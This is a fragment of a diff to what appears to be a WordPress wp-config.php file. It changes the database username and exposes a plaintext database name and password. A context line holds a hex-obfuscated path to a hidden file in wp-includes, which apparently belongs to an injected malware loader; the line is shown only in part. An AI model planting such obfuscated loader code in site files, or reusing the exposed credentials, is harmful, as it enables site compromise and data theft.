@@ -29,7 +29,7 @@ $r3 = "/\x68ome/doccure\x2dwp/public_\x68tml/wp\x2dincludes/blocks/freeform/.5f9
 define( 'DB_NAME', 'dreams' );
 
 /** Database username */
-define( 'DB_USER', 'spwygjkqxy' );
+define( 'DB_USER', 'dreams' );
 
 /** Database password */
 define( 'DB_PASSWORD', 'Dreams@99' );
